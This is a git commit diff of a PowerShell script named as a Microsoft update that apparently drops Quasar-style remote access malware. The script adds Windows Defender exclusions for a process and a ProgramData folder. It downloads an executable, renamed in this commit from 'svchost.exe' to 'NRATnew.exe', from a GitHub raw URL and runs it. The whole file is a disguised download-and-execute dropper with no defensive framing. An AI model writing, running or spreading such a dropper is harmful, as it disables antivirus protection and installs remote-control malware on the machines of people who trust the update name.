20018ca27f4d0a2caafdafa7fe72cbfdea89d70a
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-10 08:03:09 -0700

    Update microsoftupdatequasar.ps1

--- microsoftupdatequasar.ps1
+++ microsoftupdatequasar.ps1
@@ -1,10 +1,10 @@
-Add-MpPreference -ExclusionPrcoess "svchost.exe"
+Add-MpPreference -ExclusionPrcoess "NRATnew.exe"
 Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
 mkdir C:\ProgramData\zDATAxD
 cd C:\programdata\zdataxd
 mkdir quasar
 cd quasar
-$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/svchost.exe'
-$destination = 'C:\ProgramData\zDATAxD\quasar\svchost.exe'
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
+$destination = 'C:\ProgramData\zDATAxD\quasar\NRATnew.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
-start C:\programdata\zdataxd\quasar\svchost.exe
+start C:\programdata\zdataxd\quasar\NRATnew.exe
